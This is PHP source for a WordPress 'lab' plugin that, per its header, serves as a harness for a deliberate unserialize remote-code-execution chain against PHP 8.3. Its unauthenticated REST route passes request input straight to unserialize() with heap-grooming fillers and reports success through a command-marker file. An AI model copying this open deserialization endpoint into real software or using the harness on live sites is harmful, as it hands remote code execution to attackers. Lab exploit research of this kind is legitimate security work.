<?php
/**
 * Plugin Name: FA Queue Import (lab)
 * Description: php2shell MISSION 1 lab plugin: plugin-level unserialize
 * surface (HTTP import endpoint — the receipted shape34 pattern) carrying
 * the FULL zero4 in-band chain (M1 dance leak -> M2 oracle -> M3 forge ->
 * zif_system), ported to wordpress:latest PHP 8.3.36 Apache mod_php.
 * LAB PLUGIN (brief-sanctioned endpoint class).
 * Version: 1.0
 */

if ( PHP_SAPI === 'cli' ) {
	require __DIR__ . '/fa_cli_core.php';
	fa_cli_main( $argv );
	exit( 0 );
}

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

require_once __DIR__ . '/fa_cli_core.php';

add_action( 'rest_api_init', function () {
	register_rest_route( 'fa/v1', '/import', array(
		'methods'             => array( 'POST', 'GET' ),
		'permission_callback' => '__return_true',
		'callback'            => function ( $req ) {
			$data = $req->get_param( 'data' );
			if ( null === $data || '' === $data ) {
				return new WP_REST_Response( '[fa-import] PHP ' . PHP_VERSION . ' sapi=' . PHP_SAPI . ' no data', 200 );
			}
			$g = (int) ( $req->get_param( 'g' ) ?? 0 );   // groom fillers (lab knob)
			$a = (int) ( $req->get_param( 'a' ) ?? 4 );   // import retry attempts
			$f = (string) ( $req->get_param( 'f' ) ?? '8511' ); // offset flavor

			E::init( $f );
			@unlink( FA_MARKER );
			file_put_contents( FA_CMD, 'id > ' . FA_MARKER . " 2>&1\n" );
			@unlink( FA_DIAG );
			FA_Keep::$keep = [];
			for ( $i = 0; $i < $g; $i++ ) { FA_Keep::$keep[] = str_repeat( 'G', 8160 ); }

			ob_start();
			for ( $try = 1; $try <= $a; $try++ ) {
				echo "=== attempt $try ===\n";
				$r = unserialize( $data );
				echo 'outer ok=', var_export( $r !== false, true ), "\n";
				flush();
				if ( is_file( FA_MARKER ) ) { break; }
			}
			$log = ob_get_clean();
			$log = ob_get_clean();
			$hit = is_file( FA_MARKER ) ? trim( (string) file_get_contents( FA_MARKER ) ) : '';
			return new WP_REST_Response(
				'[fa-import] PHP ' . PHP_VERSION . ' sapi=' . PHP_SAPI .
				' RCE=' . ( $hit ? 'YES' : 'no' ) . "\n" . $log .
				( $hit ? "\n[MARKER] $hit\n" : '' ),
				200
			);
		},
	) );
	register_rest_route( 'fa/v1', '/receipt', array(
		'methods'             => array( 'GET' ),
		'permission_callback' => '__return_true',
		'callback'            => function () {
			$m = is_file( FA_MARKER ) ? trim( (string) file_get_contents( FA_MARKER ) ) : '(no marker)';
			$d = is_file( FA_DIAG ) ? (string) file_get_contents( FA_DIAG ) : '(no diag)';
			return new WP_REST_Response(
				'[fa-receipt] PHP ' . PHP_VERSION . ' sapi=' . PHP_SAPI .
				"\n[MARKER]\n$m\n[DIAG]\n$d", 200
			);
		},
	) );
} );
